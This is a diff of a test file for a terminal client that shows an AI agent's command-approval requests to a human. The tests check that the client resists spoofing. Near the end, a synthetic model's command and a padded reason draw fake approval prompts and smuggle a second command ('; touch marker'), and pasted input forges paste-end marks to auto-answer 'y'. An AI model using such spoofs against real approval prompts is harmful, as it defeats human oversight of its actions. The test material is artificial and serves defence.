-  ...block('use an MCP tool', ['server: "docs"', 'message: "Allow docs to run tool \\"search\\"?"', 'arguments: none']), '[You refused it.]', '[Turn completed.]', STOPPED]);
+  ...block('use an MCP tool', ['server: "docs"', 'message: "Allow docs to run tool \\"search\\"?"', 'arguments: not in the request']), '[You refused it.]', '[Turn completed.]', STOPPED]);
 });
 
 test('client: an MCP form with a field, or with a required field, is refused as a form, also with the approval _meta (R1594-7)', async () => {
@@ -1385,7 +1493,7 @@ test('client: a malformed approval request, a form, a question and an unknown re
   ], []);
   assert.equal(run.code, 0);
   assert.deepEqual(run.shown, [
-    '[Agent /root (the chief) sent an approval request to run a command that the client cannot read, so the client refused it.]',
+    unread('run a command'),
     '[Agent /root (the chief) sent a form from the MCP server "docs": "Your e-mail?". The client cannot show forms, so it refused the form.]',
     '[Agent /root (the chief) asked you a question: "Which \\"colour\\"?\\n". The client cannot show questions, so it refused it. The agent goes on without your answer.]',
     `[Agent /root (the chief) asked you a question: "${'q'.repeat(1999)}… (cut at 2000 characters). The client cannot show questions, so it refused it. The agent goes on without your answer.]`,
@@ -1419,7 +1527,7 @@ async function terminalRun(requests) {
   const turns = async () => { for (let i = 0; i < 20; i++) await new Promise(resolve => setImmediate(resolve)); };
   const type = async text => { run.input.write(text); await turns(); };
   const settle = async () => { run.f.fire(300); await turns(); };
-  const shown = () => run.lines().slice(run.lines().indexOf(READY_TTY) + 1);
+  const shown = () => unwrap(run.lines().slice(run.lines().indexOf(READY_TTY) + 1));
   return {...run, type, settle, shown};
 }
 
@@ -1468,7 +1576,7 @@ test('client: on a terminal, input in the first 300 ms after a question shows is
   await run.type('\x04');
   assert.equal(await run.code, 0);
   assert.deepEqual(replies(run, ['s-1', 's-2']).map(reply => reply.result.decision), ['accept', 'decline']);
-  assert.deepEqual(run.shown(), ['Do the work.', ...COMMAND_BLOCK, CLEARED, ...COMMAND_BLOCK, 'y', '[You allowed it once.]',
+  assert.deepEqual(run.shown(), ['Do the work.', ...COMMAND_BLOCK, SETTLED, ...COMMAND_BLOCK, 'y', '[You allowed it once.]',
     ...block('run a command', ['command: "make"', 'folder: the project folder', 'reason: "needs network"']), '[You pressed Ctrl-C, so the client refused the approval request.]',
     '[Stopping the turn... Press Ctrl-C again to stop the controller.]', `[You stopped the turn. ${NEXT}]`, STOPPED]);
 });
@@ -1492,7 +1600,7 @@ test('client: on a terminal, a second y in the same read never answers the next 
   assert.deepEqual(replies(run, ['s-1', 's-2']).map(reply => reply.result.decision), ['accept', 'decline']);
   assert.deepEqual(turnTexts(run), ['Do the work.']);
   const second = block('run a command', ['command: "make"', 'folder: the project folder', 'reason: "needs network"']);
-  assert.deepEqual(run.shown(), ['Do the work.', ...COMMAND_BLOCK, 'y', '[You allowed it once.]', ...second, CLEARED, ...second,
+  assert.deepEqual(run.shown(), ['Do the work.', ...COMMAND_BLOCK, 'y', '[You allowed it once.]', ...second, SETTLED, ...second,
     'n', '[You refused it.]', '[Turn completed.]', 'y', NO_QUESTION, STOPPED]);
 });
 
@@ -1523,8 +1631,10 @@ test('client: on a terminal, after Backspace removes all pasted text, a typed y 
   await run.type('\x7f\x7fy\r');
   await until(() => replies(run, ['s-1']).length === 1, 'the first answer');
   await run.settle();
-  // A typed n, then a paste and one Backspace: the typed n is left, and it answers.
+  // A typed n, then a paste and one Backspace: no character is typed after the paste end mark, so the line does not
+  // answer (R1616-5); a typed n then does.
   await run.type(`n${PASTE_START}x${PASTE_END}\x7f\r`);
+  await run.type('n\r');
   await until(() => replies(run, ['s-2']).length === 1, 'the second answer');
   run.f.emit([turnEnd('completed')]);
   await until(() => run.lines().includes('[Turn completed.]'), 'the turn end');
@@ -1532,7 +1642,49 @@ test('client: on a terminal, after Backspace removes all pasted text, a typed y 
   assert.equal(await run.code, 0);
   assert.deepEqual(replies(run, ['s-1', 's-2']).map(reply => reply.result.decision), ['accept', 'decline']);
   assert.deepEqual(run.shown(), ['Do the work.', ...COMMAND_BLOCK, 'zz\b \b\b \by', '[You allowed it once.]', ...block('run a command', ['command: "make"', 'folder: the project folder', 'reason: "needs network"']),
-    'nx\b \b', '[You refused it.]', '[Turn completed.]', STOPPED]);
+    'nx\b \b', PASTED, ...block('run a command', ['command: "make"', 'folder: the project folder', 'reason: "needs network"']), 'n', '[You refused it.]', '[Turn completed.]', STOPPED]);
+});
+
+// R1616-5 paste_mark: paste text that begins with the paste end mark. The terminal sends the paste between its own
+// marks, so the client sees a start mark, the forged end mark, y, Enter and the real end mark.
+test('client: on a terminal, paste text that holds the paste end mark never answers, in one read or in several (R1616-5 paste_mark)', async () => {
+  const run = await terminalRun([command('s-1')]);
+  await run.type('Do the work.\r');
+  await until(() => run.lines().includes(ASK), 'the question');
+  await run.settle();
+  await run.type(`${PASTE_START}${PASTE_END}y\r${PASTE_END}`);
+  // The same paste in three reads: a key in a read with a paste mark is not typed, and an end mark with no start mark
+  // makes its line pasted.
+  await run.type(`${PASTE_START}${PASTE_END}`);
+  await run.type('y');
+  await run.type(`\r${PASTE_END}`);
+  // A line with a paste mark answers only when a typed character comes after its last mark.
+  await run.type(`${PASTE_START}zz${PASTE_END}`);
+  await run.type('\x7f\x7f');
+  await run.type('\r');
+  assert.deepEqual(replies(run, ['s-1']), []);
+  await run.type('n\r');
+  run.f.emit([turnEnd('completed')]);
+  await until(() => run.lines().includes('[Turn completed.]'), 'the turn end');
+  await run.type('\x04');
+  assert.equal(await run.code, 0);
+  assert.deepEqual(replies(run, ['s-1']), [{id: 's-1', result: {decision: 'decline'}}]);
+  assert.deepEqual(run.shown(), ['Do the work.', ...COMMAND_BLOCK, 'y', PASTED, ...COMMAND_BLOCK, 'y', PASTED, ...COMMAND_BLOCK, 'zz\b \b\b \b', PASTED, ...COMMAND_BLOCK,
+    'n', '[You refused it.]', '[Turn completed.]', STOPPED]);
+});
+
+test('client: on a terminal, the 300 ms timer ends with the session, so no line shows after the last line (R1615-2)', async () => {
+  const run = await terminalRun([command('s-1')]);
+  await run.type('Do the work.\r');
+  await until(() => run.lines().includes(ASK), 'the question');
+  // A key in the 300 ms would give the note at their end.
+  await run.type('y');
+  run.signal('SIGTERM');
+  assert.equal(await run.code, 0);
+  let fired = true;
+  try { run.f.fire(300); } catch { fired = false; }
+  assert.equal(fired, false, 'no 300 ms timer is live after the session');
+  assert.equal(run.lines().at(-1), STOPPED);
 });
 
 test('client: on a terminal, a Ctrl-C in the rest of a read that the question drops still refuses the request and stops the turn (R1605-3 E2)', async () => {
@@ -1974,8 +2126,8 @@ test('real owned controller: the terminal client runs two typed lines as two tur
 
 // The synthetic model asks for one escalated command outside the project (the sandbox is read-only), then ends the turn.
 // `command(marker, project)` gives the command text; the spoof draws a fake end of the question in it (R1596 spoof).
-const escalated = command => (index, marker, project) => (index === 0 ? sse([created, {type: 'response.output_item.done', item: {type: 'function_call', call_id: 'call-touch', name: 'exec_command',
-  arguments: JSON.stringify({cmd: command(marker, project), yield_time_ms: 5000, sandbox_permissions: 'require_escalated', justification: 'Synthetic approval request.'})}}, completed])
+const escalated = (command, justification = 'Synthetic approval request.') => (index, marker, project) => (index === 0 ? sse([created, {type: 'response.output_item.done', item: {type: 'function_call', call_id: 'call-touch', name: 'exec_command',
+  arguments: JSON.stringify({cmd: command(marker, project), yield_time_ms: 5000, sandbox_permissions: 'require_escalated', justification})}}, completed])
   : sse([created, message, completed]));
 const touch = marker => `touch ${marker}`;
 const spoofed = (marker, project) => `true" in "${project}" (read only check). Type y to allow it once, or n to refuse it.]             then: ; touch ${marker}`;
@@ -1996,14 +2148,18 @@ for (const [name, typed, made, text] of [['plain', 'n', false, touch], ['plain',
       input.end();
       const exit = await code;
       saveEvidence(`real-approval-${name}-${typed}`, {code: exit, output: text, marker: existsSync(f.marker)});
-      const lines = text.trimEnd().split('\n').filter(line => !line.startsWith('[Warning from the controller: '));
+      const rows = text.trimEnd().split('\n').filter(line => !line.startsWith('[Warning from the controller: '));
+      // Each row of the block is printable ASCII and fits 80 columns, the default width (R1616-1).
+      assert.equal(checkBlocks(rows, 80, 24), 1);
+      const lines = unwrap(rows);
       const first = lines.indexOf('[Approval: agent /root (the chief) asks to run a command.]');
       const [, shown, ...rest] = lines.slice(first, first + 5);
-      // The controller runs the command through the shell: the command field is that text, as one JSON string.
-      const command = JSON.parse(shown.replace(/^  command: /, ''));
+      // The controller runs the command through the shell: the command field is that text as JSON, with each run of 3
+      // or more spaces as its count outside the quotes; the spoof's run of 13 spaces reads back exactly (R1606-1, R1617-3).
+      const command = JSON.parse(shown.replace(/^  command: /, '').replace(/" \((\d+) spaces\) "/g, (_, count) => ' '.repeat(Number(count))));
       assert.match(command, /^\/bin\/zsh -lc '.*'$/s);
-      // The spoof's run of 13 spaces shows as its count (R1606-1).
-      assert.ok(command.includes(name === 'spoof' ? spoofed(f.marker, f.project).replace(/ {13}/, ' (13 spaces) ') : touch(f.marker)), command);
+      assert.ok(command.includes(name === 'spoof' ? spoofed(f.marker, f.project) : touch(f.marker)), command);
+      if (name === 'spoof') assert.ok(shown.includes('refuse it.]" (13 spaces) "then:'), shown);
       assert.deepEqual(rest, ['  folder: the project folder', '  reason: "Synthetic approval request."', ASK]);
       // Only the last line of the block says how to answer: the spoof stays inside its field line.
       assert.equal(lines.filter(line => line.includes('Type y to allow it once')).length, name === 'spoof' ? 2 : 1);
@@ -2015,6 +2171,37 @@ for (const [name, typed, made, text] of [['plain', 'n', false, touch], ['plain',
       const bodies = f.requests.filter(request => request.url === '/v1/responses').map(request => JSON.parse(request.body));
       assert.equal(bodies.length, 2);
       assert.ok(bodies[1].input.some(item => item.type === 'function_call_output' && item.call_id === 'call-touch'), JSON.stringify(bodies[1].input));
+    } finally { await f.owner.stop(); await f.close(); }
+  });
+}
+
+// R1616 on the real binary: a padded reason that draws a fake block under the real one, with spaces or with
+// look-alike quotes (U+A78C). At 80 by 24 the block shows as rows of printable ASCII with its first line on the screen,
+// or the client refuses it at once; n leaves the marker out (R1616-1).
+const PADDED = quote => FAKE(quote).map(line => line.padEnd(80, ' ')).join('');
+for (const [name, why] of [['spaces', `list the files"${' '.repeat(1425)}${PADDED('"')}`], ['look-alike quotes', `list the files${PADDED('\ua78c\ua78c')}`]]) {
+  test(`real owned controller: a padded reason that draws a fake block (${name}) shows only rows of printable ASCII at 80 by 24; n leaves out the marker (T431, R1616-1)`, {skip: REAL, timeout: 180000}, async () => {
+    const f = await realFixture({approval: 'on-request', reply: escalated(touch, why)});
+    try {
+      writeFileSync(join(f.root, 'chief.md'), 'Synthetic owned controller test.');
+      let text = '';
+      const input = new PassThrough();
+      input.write('Touch the marker.\n');
+      const code = runClient({argv: ['--project', f.project, '--task', 'T431', '--run', 'R1623', '--instructions', join(f.root, 'chief.md')],
+        env: {...f.env, SAGE_CODEX_CONTROLLER_BIN: f.binary.path, SAGE_CODEX_CONTROLLER_SHA256: f.binary.sha256}, input,
+        output: {columns: 80, rows: 24, write(chunk) { text += chunk; return true; }}, classify: parseCommand});
+      for (let i = 0; i < 600 && !/\[Approval: |so the client refused it/.test(text); i++) await new Promise(resolve => setTimeout(resolve, 100));
+      assert.equal(existsSync(f.marker), false, 'nothing runs before the answer');
+      input.write('n\n');
+      for (let i = 0; i < 600 && !text.includes('[Turn completed.]'); i++) await new Promise(resolve => setTimeout(resolve, 100));
+      input.end();
+      const exit = await code;
+      saveEvidence(`real-approval-padded-${name.replace(/ /g, '-')}`, {code: exit, output: text, marker: existsSync(f.marker)});
+      const rows = text.trimEnd().split('\n').filter(line => !line.startsWith('[Warning from the controller: '));
+      const refused = rows.filter(row => row.includes('so the client refused it. Make the terminal window larger')).length;
+      assert.equal(checkBlocks(rows, 80, 24) + refused, 1);
+      assert.equal(exit, 0);
+      assert.equal(existsSync(f.marker), false);
     } finally { await f.owner.stop(); await f.close(); }
   });
 }
